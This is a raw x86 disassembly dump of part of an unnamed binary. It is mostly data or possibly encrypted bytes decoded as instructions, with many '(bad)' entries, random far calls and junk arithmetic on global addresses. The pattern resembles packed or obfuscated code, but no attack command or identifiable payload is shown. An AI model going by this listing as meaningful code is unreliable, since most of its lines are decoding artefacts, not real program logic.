  406211:	and    DWORD PTR [ecx],edi
  406213:	fwait
  406214:	(bad)
  406218:	call   0x8aa5ab6a
  40621d:	in     al,dx
  40621e:	mov    eax,0x5a0843f7
  406223:	jne    0x40620a
  406225:	shl    BYTE PTR [edi+0x6d],0x1f
  406229:	xchg   esp,eax
  40622a:	mov    bl,0xb2
  40622c:	ds cmp eax,0xbb9c763
  406232:	pushf  
  406233:	(bad)  
  406234:	or     al,0xe3
  406236:	scas   al,BYTE PTR es:[edi]
  406237:	cmp    al,0x3c
  406239:	call   0x60298bcc
  40623e:	out    dx,eax
  40623f:	into   
  406240:	imul   esp,DWORD PTR [edi],0x56
  406243:	mov    al,ds:0x7478b670
  406248:	loopne 0x40625a
  40624a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40624b:	dec    edi
  40624c:	mov    esi,0xfdf5f452
  406251:	jns    0x406271
  406253:	arpl   WORD PTR [edx+0xf8d25f2],si
  406259:	sbb    bl,BYTE PTR [esi+0x7769ef75]
  40625f:	sahf   
  406260:	jg     0x4061f3
  406262:	add    DWORD PTR [ebx-0x7c],eax
  406265:	loop   0x40625c
  406267:	inc    esi
  406268:	push   eax
  406269:	loope  0x40627b
  40626b:	and    BYTE PTR [esi-0x3c],ah
  40626e:	iret   
  40626f:	push   ebp
  406270:	ret    
  406271:	dec    ebx
  406272:	push   esp
  406273:	fist   DWORD PTR [edx]
  406275:	push   ebx
  406276:	imul   ebx,DWORD PTR [edx+0x4ba11b7a],0x1c4dcfda
  406280:	dec    ecx
  406281:	call   0xddb6:0xcf2d74ee
  406288:	and    BYTE PTR [edi-0x10],ch
  40628b:	(bad)  
  40628c:	sbb    eax,DWORD PTR [eax-0x75]
  40628f:	inc    ebp
  406290:	sbb    BYTE PTR [ebx+0x2d811075],cl
  406296:	mov    ebp,edi
  406298:	inc    edx
  406299:	add    BYTE PTR [esi],al
  40629b:	inc    BYTE PTR [edx+0x0]
  40629e:	mov    DWORD PTR [esi+0xc],eax
  4062a1:	or     DWORD PTR ds:0x42e773,ecx
  4062a7:	mov    eax,DWORD PTR [ebp+0x1c]
  4062aa:	mov    DWORD PTR ds:0x42fdf2,0x1e
  4062b4:	cmp    DWORD PTR ds:0x42fdf2,0x0
  4062bb:	je     0x40630e
  4062c1:	cmp    DWORD PTR ds:0x42fdf2,0x7
  4062c8:	jne    0x4062e2
  4062ce:	push   0x4403
  4062d3:	push   DWORD PTR [ebp-0x10]
  4062d6:	push   DWORD PTR [ebp-0x24]
  4062d9:	push   DWORD PTR [ebp-0x10]
  4062dc:	call   DWORD PTR ds:0x42e5bb
  4062e2:	cmp    DWORD PTR ds:0x42fdf2,0x8
  4062e9:	jne    0x4062fc
  4062ef:	mov    esi,DWORD PTR ds:0x42fdf2
  4062f5:	dec    esi
  4062f6:	mov    DWORD PTR ds:0x42fdf2,esi
  4062fc:	mov    esi,DWORD PTR ds:0x42fdf2
  406302:	dec    esi
  406303:	mov    DWORD PTR ds:0x42fdf2,esi
  406309:	jmp    0x4062b4
  40630e:	mov    esi,DWORD PTR [ebp+0x10]
  406311:	mov    DWORD PTR [esi+0x10],eax
  406314:	mov    eax,eax
  406316:	mov    eax,DWORD PTR [ebp+0x8]
  406319:	xor    eax,ecx
  40631b:	add    eax,edx
  40631d:	jmp    0x4064e3
  406322:	jge    0x4063a3
  406324:	gs cli 
  406326:	gs (bad) 
  406329:	sti    
  40632a:	ret    
  40632b:	pusha  
  40632c:	jo     0x4062dd
  40632e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40632f:	gs retf 
  406331:	scas   al,BYTE PTR es:[edi]
  406332:	mov    WORD PTR [eax+esi*2],?
  406335:	jo     0x4062de
  406337:	jg     0x4063a9
  406339:	jo     0x40631e
  40633b:	add    edi,DWORD PTR [ebx]
  40633d:	pop    ebx
  40633e:	inc    edi
  40633f:	daa    
  406340:	mov    BYTE PTR [ebx-0x59],al
  406343:	dec    edx
  406344:	cdq    
  406345:	aam    0xab
  406347:	sar    BYTE PTR [eax-0x3a],1
  40634a:	push   esp
  40634b:	out    0xf,eax
  40634d:	cmovo  edi,DWORD PTR [esi+0x225ca499]
  406354:	mov    ch,0x3e
  406356:	push   esi
  406357:	hlt    
  406358:	(bad)  
  40635a:	xor    dh,cl
  40635c:	and    DWORD PTR ss:[edx-0x3b7de236],ebp
  406363:	fwait
  406364:	sahf   
  406365:	fsubr  st,st(2)
  406367:	in     eax,dx
  406368:	xor    dl,BYTE PTR [esi+ebx*2]
  40636b:	dec    ebx
  40636c:	outs   dx,DWORD PTR ds:[esi]
  40636d:	push   ecx
  40636e:	aas    
  40636f:	sbb    BYTE PTR [edx],ah
  406371:	mov    ah,0x2a
  406373:	test   BYTE PTR [ecx],0x37
  406376:	test   BYTE PTR [edx-0x48],0xf2
  40637a:	rcr    DWORD PTR [esi+0x6f],0x99
  40637e:	enter  0xe59f,0xfc
  406382:	outs   dx,DWORD PTR ds:[esi]
  406383:	pop    ecx
  406384:	jecxz  0x4063f8
  406386:	mov    eax,ds:0xba77332a
  40638b:	ret    
  40638c:	shl    BYTE PTR [ecx-0x47],1
  40638f:	cmc    
  406390:	lds    esp,FWORD PTR [ecx]
  406392:	dec    ecx
  406393:	or     bl,BYTE PTR [eax-0x404a968a]
  406399:	stc    
  40639a:	lahf   
  40639b:	push   0xe9961a6e
  4063a0:	mov    cl,0xd6
  4063a2:	dec    esi
  4063a3:	call   0xb4f66274
  4063a8:	popa   
  4063a9:	mov    ebx,0xa6de1e00
  4063ae:	pop    ss
  4063af:	mov    al,0xb1
  4063b1:	lds    esp,FWORD PTR [ecx+0x25b7c9c0]
  4063b7:	dec    ebx
  4063b8:	stos   BYTE PTR es:[edi],al
  4063b9:	inc    ecx
  4063ba:	hlt    
  4063bb:	pop    ss
  4063bc:	mov    ds:0xe86fc9b6,eax
  4063c1:	fscale 
  4063c3:	mov    DWORD PTR [eax-0x4366c243],ecx
  4063c9:	push   eax
  4063ca:	or     al,0xed
  4063cc:	div    BYTE PTR [eax+0x75]
  4063cf:	out    0x66,al
  4063d1:	retf   0xb063
  4063d4:	mov    dh,0xc6
  4063d6:	push   eax
  4063d7:	leave  
  4063d8:	gs stos DWORD PTR es:[edi],eax
  4063da:	call   0x2507:0xbd897b7d
  4063e1:	cmp    al,ch
  4063e3:	aas    
  4063e4:	sub    eax,0x3d4c80c
  4063e9:	div    DWORD PTR [ebx+ecx*2+0x364538d9]
  4063f0:	lahf   
  4063f1:	pop    eax
  4063f2:	push   edx
  4063f3:	loopne 0x406469
  4063f5:	lock mov DWORD PTR [edx-0x43babe5],edx
  4063fc:	sbb    dl,BYTE PTR [ecx]
  4063fe:	repz in al,0x9a
  406401:	mov    dl,0xf0
  406403:	loop   0x40640a
  406405:	dec    esp
  406406:	pop    es
  406407:	mov    esi,0xb5ee0f34
  40640c:	lods   eax,DWORD PTR ds:[esi]
  40640d:	adc    eax,0x4326b52f
  406412:	adc    edi,DWORD PTR [edx+0x14]
  406415:	sbb    eax,0xef01d998
  40641a:	jnp    0x4063b5
  40641c:	bsr    ebp,DWORD PTR es:[ebp+0x2b]
  406421:	popf   
  406422:	sub    esp,eax
  406424:	ds xor dh,bl
  406427:	push   0x5a
  406429:	pop    ebx
  40642a:	gs pop ebx
  40642c:	enter  0x1282,0x2d
  406430:	retf   
  406431:	xchg   DWORD PTR [eax],ebx
  406433:	outs   dx,DWORD PTR ds:[esi]
  406434:	rcr    DWORD PTR [eax-0x995ca83],0x43
  40643b:	cld    
  40643c:	lds    edx,FWORD PTR [edi-0x30]
  40643f:	dec    ecx
  406440:	pop    esi
  406441:	scas   eax,DWORD PTR es:[edi]
  406442:	dec    edi
  406443:	clc    
  406444:	lahf   
  406445:	pop    ss
  406446:	lahf   
  406447:	mov    dh,0xa6
  406449:	test   DWORD PTR [ebx-0x2a5507c4],edx
  40644f:	inc    esi
  406450:	push   ecx
  406451:	dec    esp
  406452:	nop
  406453:	add    al,0xb0
  406455:	enter  0x6258,0x3
  406459:	stos   BYTE PTR es:[edi],al
  40645a:	jp     0x406453
  40645c:	jle    0x406474
  40645e:	xor    eax,0x8ee0db16
  406463:	popf   
  406464:	push   esp
  406465:	retf   0x3b44
  406468:	adc    edi,ebx
  40646a:	and    BYTE PTR [ebx],bl
  40646c:	lods   eax,DWORD PTR ds:[esi]
  40646d:	pop    ebx
  40646e:	cmp    ebx,edi
  406470:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406471:	fnstcw WORD PTR ds:0x2c5019aa
  406477:	pop    edi
  406478:	sbb    al,0xf7
  40647a:	fmul   st(4),st
  40647c:	sbb    al,0x6d
  40647e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40647f:	mov    ch,0xcd
  406481:	lahf   
  406482:	push   esp
  406483:	loop   0x406455
  406485:	xchg   edx,eax
  406486:	(bad)  
  406487:	xlat   BYTE PTR ds:[ebx]
  406488:	stos   DWORD PTR es:[edi],eax
  406489:	adc    al,0xdb
  40648b:	add    ah,BYTE PTR [eax+0x6337d86c]
  406491:	imul   eax,DWORD PTR [esi+ecx*1],0x27
  406495:	pop    ebp
  406496:	mov    bl,0xf4
  406498:	icebp  
  406499:	pop    ss
  40649a:	jg     0x406442
  40649c:	push   es
  40649d:	mov    ds,ebp
  40649f:	ret    0x8a3
  4064a2:	or     eax,0x80dc6bde
  4064a7:	pusha  
  4064a8:	out    dx,eax
  4064a9:	ret    
  4064aa:	pop    ebp
  4064ab:	pop    edi
  4064ac:	retf   
  4064ad:	mov    cs,WORD PTR [esi-0x3d42be9d]
  4064b3:	shr    BYTE PTR [edx+0x3a],1
  4064b6:	pop    es
  4064b7:	sub    bh,cl
  4064b9:	enter  0x5eed,0x3d
  4064bd:	retf   
  4064be:	xchg   edi,eax
  4064bf:	xchg   edi,eax
  4064c0:	es and al,0xc4
  4064c3:	cmp    al,ah
  4064c5:	sub    DWORD PTR [ebp+0x5e],0xffffffcb
  4064c9:	adc    BYTE PTR [ebx+0x5a],ch
  4064cc:	imul   edx,DWORD PTR [esi+0x45],0x1f
  4064d0:	test   DWORD PTR [edi],ebp
  4064d2:	xchg   ebp,eax
  4064d3:	xchg   ebx,eax
  4064d4:	sti    
  4064d5:	push   0xffffff9b
  4064d7:	mov    ah,BYTE PTR [esi+ecx*4-0x35]
  4064db:	int    0x96
  4064dd:	push   esi
  4064de:	mov    ?,WORD PTR [edi+0x5eab6ff8]
  4064e4:	leave  
  4064e5:	ret    0x18
  4064e8:	push   ebp
  4064e9:	mov    ebp,esp
  4064eb:	mov    eax,DWORD PTR [ebp+0xc]
  4064ee:	xor    edx,edx
  4064f0:	mov    ecx,0x7264fca9
  4064f5:	div    ecx
  4064f7:	mov    ecx,DWORD PTR [ebp+0x10]
  4064fa:	and    ecx,eax
  4064fc:	or     ecx,0x81161d8f
  406502:	mov    eax,ecx
  406504:	pop    ebp
  406505:	ret    0x18
  406508:	push   ebp
  406509:	mov    ebp,esp
  40650b:	push   ecx
  40650c:	adc    DWORD PTR ds:0x42fdf6,edi
  406512:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  406519:	mov    eax,DWORD PTR [ebp-0x4]
  40651c:	sbb    ecx,DWORD PTR ds:0x42fd79
  406522:	mov    edx,DWORD PTR [ebp+0x10]
  406525:	mov    ecx,0x7510855
  40652a:	xor    eax,ecx
  40652c:	add    eax,0x32729c
  406531:	mov    DWORD PTR [edx],eax
  406533:	sub    DWORD PTR ds:0x42fdf2,edi
  406539:	mov    eax,DWORD PTR [ebp+0x14]
  40653c:	sub    DWORD PTR ds:0x42fdf2,ecx
  406542:	mov    edx,DWORD PTR [ebp+0x10]
  406545:	and    DWORD PTR ds:0x42fd59,0x42e77b
  40654f:	mov    DWORD PTR [edx+0x4],eax
  406552:	mov    eax,DWORD PTR [ebp+0x18]
  406555:	jmp    0x4067e0
  40655a:	mov    ss,edx
  40655c:	jg     0x40659a
  40655e:	inc    ebx
  40655f:	ror    DWORD PTR [ecx+0x52],1
  406562:	jae    0x4065d2
  406564:	pop    edx
  406565:	dec    ecx
  406566:	call   0x703a:0x33aa2930
  40656d:	jo     0x406551
  40656f:	jle    0x4065e1
  406571:	jo     0x4065b5
  406573:	jge    0x406527
  406575:	mov    ecx,DWORD PTR [edx+edi*8+0x561ddb7c]
  40657c:	mov    dh,0x14
  40657e:	fist   DWORD PTR [edi+0x57918bb1]
  406584:	push   es
  406585:	xchg   cl,ah
  406587:	cli    
  406588:	jecxz  0x4065ef
  40658a:	sbb    DWORD PTR [edx],0x63
  40658d:	mov    eax,esp
  40658f:	sbb    ebp,edi
  406591:	cmp    al,0xb0
  406593:	add    DWORD PTR [edi-0x4a9a8887],ebp
  406599:	push   es
  40659a:	sar    BYTE PTR fs:[eax-0x60],1
  40659e:	outs   dx,BYTE PTR ds:[esi]
  40659f:	mov    ds:0x33c62698,al
  4065a4:	in     eax,0xbd
  4065a6:	scas   al,BYTE PTR es:[edi]
  4065a7:	sahf   
  4065a8:	sub    BYTE PTR [ecx-0x33c9cba1],al
  4065ae:	dec    eax
  4065af:	(bad)  
  4065b0:	or     BYTE PTR [ebx+0x58],cl
  4065b3:	dec    edi
  4065b4:	jmp    0xe48ea685
  4065b9:	test   al,0x4a
  4065bb:	test   edi,edx
  4065bd:	jecxz  0x4065fb
  4065bf:	sar    DWORD PTR [edi],1
  4065c1:	inc    ecx
  4065c2:	inc    edi
  4065c3:	lods   al,BYTE PTR ds:[esi]
  4065c4:	and    edi,ebp
  4065c6:	imul   ebx,DWORD PTR [ecx-0x36],0xffffffe2
  4065ca:	lods   eax,DWORD PTR ds:[esi]
  4065cb:	push   ss
  4065cc:	ficomp WORD PTR [ebp+eiz*1-0x5965874b]
  4065d3:	cld    
  4065d4:	ins    BYTE PTR es:[edi],dx
  4065d5:	cmp    ebx,esp
  4065d7:	leave  
  4065d8:	inc    ecx
  4065d9:	xor    eax,0x7dd8e147
  4065de:	jnp    0x406612
  4065e0:	dec    ecx
  4065e1:	lock cmp ecx,DWORD PTR [ebx-0x1b8acc61]
  4065e8:	pop    ebp
  4065e9:	sub    ebp,DWORD PTR [ebx-0x18fa1ae1]
  4065ef:	mov    bl,0xd2
  4065f1:	enter  0xf2e2,0x43
  4065f5:	sahf   
  4065f6:	shr    ch,0x48
  4065f9:	jnp    0x4065f6
  4065fb:	fst    QWORD PTR [ebp+0x77]
  4065fe:	call   0xf8c040e
  406603:	out    dx,al
  406604:	xchg   edx,eax
  406605:	mov    ecx,0xbdc30682
  40660a:	shl    edi,0x69
  40660d:	or     DWORD PTR [eax],edi
  40660f:	fwait
  406610:	ret    0x9b91
  406613:	inc    ebx
  406614:	mov    WORD PTR [ebp+0x5a],gs
  406617:	or     dl,BYTE PTR [edx]
  406619:	rcl    dl,cl
  40661b:	and    eax,0x90961ec5
  406620:	add    ecx,DWORD PTR [edi+0x73f952ef]
  406626:	ret    
  406627:	pusha  
  406628:	dec    ecx
  406629:	pop    ss
  40662a:	pop    ebx
  40662b:	sti    
  40662c:	or     DWORD PTR [edx+0x69],esp
  40662f:	push   eax
  406630:	dec    ebx
  406631:	fcmovnb st,st(4)
  406633:	fwait
  406634:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406635:	sub    bh,bh
  406637:	pop    ds
  406638:	push   ds
  406639:	adc    cl,BYTE PTR [ecx-0x70]
  40663c:	sbb    DWORD PTR [ebp-0x4f],esi
  40663f:	loope  0x4066b3
  406641:	add    eax,0x7a6b5b4b
  406646:	jns    0x4065fc
  406648:	mov    ds:0xbe7467cb,eax
  40664d:	dec    ebx
  40664e:	and    edx,DWORD PTR [esi+0x7a2b0ae5]
  406654:	sbb    BYTE PTR [edi-0x3c5c1fb9],0xf6
  40665b:	cmp    ch,0x9f
  40665e:	dec    edx
  40665f:	inc    eax
  406660:	cmp    DWORD PTR [edi+esi*1+0x18],edi
  406664:	stos   DWORD PTR es:[edi],eax
  406665:	cli    
  406666:	fs ins BYTE PTR es:[edi],dx
  406668:	dec    ebp
  406669:	int3   
  40666a:	pop    ds
  40666b:	popf   
  40666c:	imul   edi,DWORD PTR [ecx-0x7e],0xffffffb5
  406670:	pop    edx
  406671:	lock stos BYTE PTR es:[edi],al
  406673:	and    al,0x1f
  406675:	mov    dh,0x7c
  406677:	fisubr WORD PTR [ebx+0x73]
  40667a:	adc    BYTE PTR [ecx+edx*8-0x3f],dl
  40667e:	call   0x789601e0
  406683:	and    eax,0x6f1d41a5
  406688:	dec    edi
  406689:	dec    eax
  40668a:	pushf  
  40668b:	int3   
  40668c:	mov    bl,0x3c
  40668e:	lahf   
  40668f:	add    edi,esp
  406691:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406692:	icebp  
  406693:	xor    al,0x2c
  406695:	jno    0x406708
  406697:	cwde   
  406698:	pop    ebx
  406699:	jle    0x40666e
  40669b:	imul   ecx,DWORD PTR [ebx-0x5dc63526],0xffffffe5
  4066a2:	mov    ?,WORD PTR [edi-0x59d050ca]
  4066a8:	push   ecx
  4066a9:	mov    ah,0x6a
  4066ab:	das    
  4066ac:	aas    
  4066ad:	lock xchg esp,eax
  4066af:	sbb    eax,0x9168899e
  4066b4:	test   eax,esp
  4066b6:	jo     0x40671d
  4066b8:	push   0xe
  4066ba:	push   esp
  4066bb:	dec    eax
  4066bd:	cdq    
  4066be:	pop    ss
  4066bf:	sti    
  4066c0:	jns    0x40668b
  4066c2:	pop    ds
  4066c3:	cld    
  4066c4:	dec    edx
  4066c5:	inc    ebp
  4066c6:	xor    al,0x60
  4066c8:	cmp    ah,ah
  4066ca:	push   ebp
  4066cb:	repz sbb BYTE PTR [edi+0x6d178760],0x8d
  4066d3:	leave  
  4066d4:	mov    edi,0xa92697a1
  4066d9:	les    esi,FWORD PTR [ebx-0x3e]
  4066dc:	or     eax,0x98268371
  4066e1:	pop    esp
  4066e2:	ss pop es
  4066e4:	adc    DWORD PTR [eax],eax
  4066e6:	mov    DWORD PTR [esi],0x9b52bcec
  4066ec:	shl    BYTE PTR [esi+ebp*8-0x53269ffd],cl
  4066f3:	sub    eax,0x32a04fd9
  4066f8:	xor    bl,BYTE PTR [edi]
  4066fa:	xlat   BYTE PTR ds:[ebx]
  4066fb:	mov    edx,0x2eab7cd4
  406700:	inc    esi
  406701:	jae    0x40674b
  406703:	dec    ecx
  406704:	sti    
  406705:	pop    ds
  406706:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406707:	inc    ebp
  406708:	retf   
  406709:	mov    dl,0xe0
  40670b:	sti    
  40670c:	mov    cl,0xa4
  40670e:	ficomp DWORD PTR [si-0x4831]
  406713:	inc    esi
  406714:	clc    
  406715:	jbe    0x406782
  406717:	jl     0x40673c
  406719:	hlt    
  40671a:	ss sub al,0xa4
  40671d:	and    bh,BYTE PTR [eax+ecx*8]
  406720:	hlt    
  406721:	cmp    ebx,DWORD PTR cs:[esi]
  406724:	xor    al,cl
  406726:	xchg   ebx,eax
  406727:	shr    DWORD PTR [edx+0x2f],1
  40672a:	dec    ebx
  40672b:	neg    DWORD PTR [ebx-0x27]
  40672e:	cmp    al,0x6
  406730:	push   esp
  406731:	je     0x406719
  406733:	retf   0xc501
  406736:	aaa    
  406737:	arpl   WORD PTR [edx-0x411c6039],bx
  40673d:	cld    
  40673e:	pop    ebp
  40673f:	sub    eax,0xeabf43c7
  406744:	inc    eax
  406745:	out    0x15,al
  406747:	and    al,0xd8
  406749:	pusha  
  40674a:	xor    eax,0x8382f990
  40674f:	jo     0x40676f
  406751:	test   DWORD PTR [eax],0xa80af5b8
  406757:	fcom   QWORD PTR [ecx-0x3]
  40675a:	mov    cl,0xf6
  40675c:	std    
  40675d:	addr16 daa 
  40675f:	outs   dx,BYTE PTR ds:[esi]
  406760:	jl     0x4066fe
  406762:	or     edx,edx
  406764:	and    DWORD PTR [ecx+edi*1+0x4ae927aa],0x50
  40676c:	bound  eax,QWORD PTR [ebp-0x6e820b11]
  406772:	aas    
  406773:	dec    ebx
  406774:	xchg   BYTE PTR [edx-0x7],ah
  406777:	stc    
  406778:	mov    ebx,esi
  40677a:	inc    ebp
  40677b:	sub    edi,ebp
  40677d:	xchg   DWORD PTR [eax+0x3af88e7],esi
  406783:	xchg   ecx,eax
  406784:	adc    esi,DWORD PTR [edx]
  406786:	cld    
  406787:	in     eax,dx
  406788:	iret   
  406789:	jmp    0x406770
  40678b:	in     eax,dx
  40678c:	and    BYTE PTR [ebp-0x2f],0xee
  406790:	pop    es
  406791:	jae    0x40679a
  406793:	mov    esp,0xe690f896
  406798:	pop    ecx
  406799:	mov    WORD PTR [edx+esi*8+0x26b644a8],es
  4067a0:	mov    ds,WORD PTR [ecx]
  4067a2:	mov    ah,0xc4
  4067a4:	lock pop ecx
  4067a6:	xchg   esp,eax
  4067a7:	mov    ?,WORD PTR [esi-0x28a3c1df]
  4067ad:	mov    edx,0xe2732871
  4067b2:	shr    edi,0x43
  4067b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067b6:	test   DWORD PTR [eax-0x38],ecx
  4067b9:	leave  
  4067ba:	scas   eax,DWORD PTR es:[edi]
  4067bb:	push   ss
  4067bc:	shl    BYTE PTR [edx],1
  4067be:	out    0xc7,al
  4067c0:	pop    edi
  4067c1:	fiadd  WORD PTR [edi+ecx*8+0x30]
  4067c5:	push   cs
  4067c6:	and    edi,DWORD PTR [ebp-0x1102451f]
  4067cc:	ins    BYTE PTR es:[edi],dx
  4067cd:	out    dx,al
  4067ce:	inc    edi
  4067cf:	adc    eax,0xd1695f76
  4067d4:	data16 cli 
  4067d6:	pop    edx
  4067d7:	dec    esp
  4067d8:	enter  0x1394,0x2a
  4067dc:	add    DWORD PTR [ebx],ebx
  4067de:	mov    ah,0x3c
  4067e0:	mov    edx,DWORD PTR [ebp+0x10]
  4067e3:	mov    DWORD PTR [edx+0x8],eax
  4067e6:	xor    eax,edx
  4067e8:	mov    eax,DWORD PTR [ebp+0x1c]
  4067eb:	mov    edx,DWORD PTR [ebp+0x10]
  4067ee:	adc    DWORD PTR ds:0x42fd55,0x1a3e
  4067f8:	mov    DWORD PTR [edx+0xc],eax
  4067fb:	mov    eax,DWORD PTR [ebp+0x20]
  4067fe:	or     DWORD PTR ds:0x42e1a0,0x7513
  406808:	mov    edx,DWORD PTR [ebp+0x10]
  40680b:	sub    DWORD PTR ds:0x42e77b,0x76c6
  406815:	mov    DWORD PTR [edx+0x10],eax
  406818:	and    DWORD PTR ds:0x42fd65,0x42e793
  406822:	mov    eax,eax
  406824:	mov    eax,DWORD PTR [ebp+0x14]
  406827:	test   eax,eax
  406829:	mov    eax,DWORD PTR [ebp+0x8]
  40682c:	jne    0x406ac0
  406832:	mov    eax,DWORD PTR [ebp+0xc]
  406835:	jmp    0x406ac0
  40683a:	sub    DWORD PTR ds:0x49e98909,edi
  406840:	test   eax,0xf5555d5d
  406845:	pushf  
  406846:	lods   eax,DWORD PTR ds:[esi]
  406847:	lods   eax,DWORD PTR ds:[esi]
  406848:	retf   
  406849:	or     esp,DWORD PTR [ebp-0x1d8f8fc8]
  40684f:	jle    0x4068c1
  406851:	jo     0x4068bb
  406853:	leave  
  406854:	inc    edx
  406855:	inc    edx
  406856:	push   ebx
  406857:	cmp    BYTE PTR ds:0x475d376d,0xef
  40685e:	inc    ebx
  40685f:	lds    esi,FWORD PTR ds:0xbc13490c
  406865:	icebp  
  406866:	jnp    0x406801
  406868:	jne    0x4067fc
  40686a:	mov    ch,0x20
  40686c:	stos   DWORD PTR es:[edi],eax
  40686d:	xor    eax,0xb5d5be3
  406872:	dec    ebp
  406873:	in     al,0x96
  406875:	or     ecx,edx
  406877:	int    0xfd
  406879:	retf   0xb4f2
  40687c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40687d:	inc    ebx
  40687e:	push   cs
  40687f:	jae    0x406832
  406881:	leave  
  406882:	mov    BYTE PTR [ecx],al
  406884:	neg    eax
  406886:	shr    BYTE PTR [ebx+0x974cd11],0x37
  40688d:	and    DWORD PTR [edx],0x8922e10d
  406893:	(bad)  
  406895:	pop    ebx
  406896:	addr16 adc al,0x84
  406899:	scas   al,BYTE PTR es:[edi]
  40689a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40689b:	xor    bh,cl
  40689d:	sti    
  40689e:	sbb    al,0xf
  4068a0:	(bad)  
  4068a1:	push   esi
  4068a2:	pop    edx
  4068a3:	sub    eax,0x5ba663ac
  4068a8:	inc    eax
  4068a9:	in     eax,dx
  4068aa:	ins    DWORD PTR es:[edi],dx
  4068ab:	pop    es
  4068ac:	in     eax,0x53
  4068ae:	lds    edi,FWORD PTR [esi+ecx*2+0x10ae6fe0]
  4068b5:	inc    ecx
  4068b6:	lahf   
  4068b7:	das    
  4068b8:	pop    eax
  4068b9:	pop    edx
  4068ba:	ja     0x40684d
  4068bc:	xchg   edx,eax
  4068bd:	mov    bh,0xb8
  4068bf:	repnz call 0xefca:0xd63dacbf
  4068c7:	in     al,dx
  4068c8:	add    ch,BYTE PTR [esi+0x66]
  4068cb:	repz jmp 0x4068bf
  4068ce:	or     eax,0x86a900c2
  4068d3:	or     eax,0x55227578
  4068d8:	mov    al,ds:0x70ae7928
  4068dd:	xor    DWORD PTR [edi-0xf],0xffffffc0
  4068e1:	out    dx,eax
  4068e2:	pushf  
  4068e3:	stc    
  4068e4:	(bad)  
  4068e5:	mov    ds:0x684cc587,al
  4068ea:	mov    edi,ebp
  4068ec:	shr    DWORD PTR fs:[eax],0xf5
  4068f0:	call   0x1b1f935f
  4068f5:	mov    DWORD PTR [esi+0x1e8c92fe],edi
  4068fb:	out    dx,al
  4068fc:	inc    esi
  4068fd:	jno    0x406970
  4068ff:	jecxz  0x4068d1
  406901:	dec    esp
  406902:	std    
  406903:	mov    BYTE PTR [edx+0x50],ch
  406906:	mov    dh,0x37
  406908:	inc    esp
  406909:	ret    
  40690a:	out    dx,eax
  40690b:	or     DWORD PTR [esi],0xfffffff7
  40690e:	dec    ebx
  40690f:	ret    
  406910:	cld    
  406911:	in     eax,0xeb
  406913:	add    dl,dh
  406915:	jmp    0x88b2:0xd5ab9cf1
  40691c:	and    DWORD PTR [ebx+0x6ee153d9],ecx
  406922:	jo     0x4068c3
  406924:	mov    eax,0x4a909934
  406929:	ja     0x4068f7
  40692b:	jmp    0x40699d
  40692d:	jp     0x406973
  40692f:	push   edx
  406930:	sbb    BYTE PTR [ebp-0x68],ah
  406933:	mov    edi,0xb048c4aa
  406938:	mov    dh,0xa0
  40693a:	test   BYTE PTR [esi+0x6bd73ad4],0xec
  406941:	std    
  406942:	dec    edi
  406943:	test   DWORD PTR [ebx],ebp
  406945:	mov    bh,0x25
  406947:	mov    bh,0x62
  406949:	mov    dh,0x6b
  40694b:	out    0x9a,eax
  40694d:	push   ss
  40694e:	mov    dl,BYTE PTR [eax+0x1c402ca6]
  406954:	retf   0x5940
  406957:	lahf   
  406958:	fnstcw WORD PTR [edx]
  40695a:	xor    ebp,DWORD PTR [esi]
  40695c:	xchg   ecx,eax
  40695d:	es mov ecx,0xe9158223
  406963:	sub    dl,BYTE PTR [eax+0x6764bd00]
  406969:	fldcw  WORD PTR [eax+ebp*1-0x5ef4314a]
  406970:	adc    eax,0x18b58592
  406975:	loopne 0x40695f
  406977:	out    0x7e,eax
  406979:	mov    ds:0x18c381f6,al
  40697e:	adc    DWORD PTR [esp+eiz*4-0x1d],edi
  406982:	fcmovb st,st(3)
  406984:	retf   
  406985:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406986:	xchg   ebx,eax
  406987:	push   eax
  406988:	mov    eax,ds:0x94a3c58c
  40698d:	leave  
  40698e:	hlt    
  40698f:	mov    ebx,0xd9a6c098
  406994:	cmc    
  406995:	in     al,0xe4
  406997:	cli    
  406998:	push   cs
  406999:	push   esi
  40699a:	jns    0x4069e4
  40699c:	add    eax,0x2b846b17
  4069a1:	aas    
  4069a2:	mov    eax,DWORD PTR [edx-0x53fd20fa]
  4069a8:	test   BYTE PTR [edx-0x75],dl
  4069ab:	(bad)  
  4069ad:	add    ch,dh
  4069af:	xchg   esi,eax
  4069b0:	xchg   ecx,eax
  4069b1:	mov    dh,0x4c
  4069b3:	pop    ds
  4069b4:	xor    BYTE PTR [edx],bl
  4069b6:	xchg   edi,eax
  4069b7:	pusha  
  4069b8:	enter  0x955b,0xa3
  4069bc:	xor    DWORD PTR [esi],edx
  4069be:	retf   
  4069bf:	inc    ebp
  4069c0:	nop
  4069c1:	push   0xffffffef
  4069c3:	std    
  4069c4:	stos   BYTE PTR es:[edi],al
  4069c5:	xor    ebp,DWORD PTR cs:[ecx-0x3204be30]
  4069cc:	dec    edi
  4069cd:	out    dx,al
  4069ce:	(bad)  [edi-0x1d7cff0f]
  4069d4:	push   esp
  4069d5:	jo     0x406977
  4069d7:	jp     0x40699a
  4069d9:	ja     0x406a03
  4069db:	div    DWORD PTR [ecx*4+0x77029e59]
  4069e2:	scas   eax,DWORD PTR es:[edi]
  4069e3:	enter  0xb8a5,0xca
  4069e7:	xchg   edi,eax
  4069e8:	cld    
  4069e9:	outs   dx,DWORD PTR ds:[esi]
  4069ea:	add    al,BYTE PTR [edi]
  4069ec:	cdq    
  4069ed:	hlt    
  4069ee:	fld    DWORD PTR [eax-0x5e]
  4069f1:	dec    ecx
  4069f2:	xchg   ebp,eax
  4069f3:	jne    0x4069f4
  4069f5:	call   0xf107feba
  4069fa:	xor    eax,0xe82ed5c
  4069ff:	push   esi
  406a00:	aad    0x49
  406a02:	push   eax
  406a03:	fmul   QWORD PTR [ecx-0x60]
  406a06:	push   ecx
  406a07:	fdivp  st(1),st
  406a09:	push   es
